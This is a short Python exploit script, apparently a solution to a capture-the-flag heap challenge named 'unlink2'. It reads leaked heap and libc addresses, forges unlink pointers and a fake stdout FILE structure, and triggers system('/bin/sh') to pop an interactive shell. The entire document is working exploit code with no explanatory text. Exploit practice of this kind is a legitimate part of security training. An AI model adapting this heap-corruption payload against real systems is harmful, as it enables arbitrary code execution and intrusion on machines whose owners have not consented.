import pwnbox,struct,os
pack = lambda x : struct.pack("<Q",x)
p = pwnbox.pipe.ProcessPipe("./unlink2",log_to=None)
def write(target,value,lock,adr):
  FD = pack(value)
  BK = pack(target)
  pay = ""
  pay += "A"*0x10
  pay += FD
  pay += BK
  pay +="/bin/sh\x00"+"\x00"*128+pack(lock)+"\x00"*72+pack(value+216)+pack(adr)*100
  p.write(pay+"\n")
p.read_until("heap (")
heap = int(p.read_until(",")[2:-1],16)
p.read_until("system address: ")
system = int(p.read_until(".")[2:-1],16)
libc = system - 0x45380
stdout = libc+0x00000000003c4708
lock = libc + 0x3c5780
name= libc-0x7f8a8c326000+0x7f8a8c36b219
write(stdout,heap+0x30,lock,system)
p.interact()
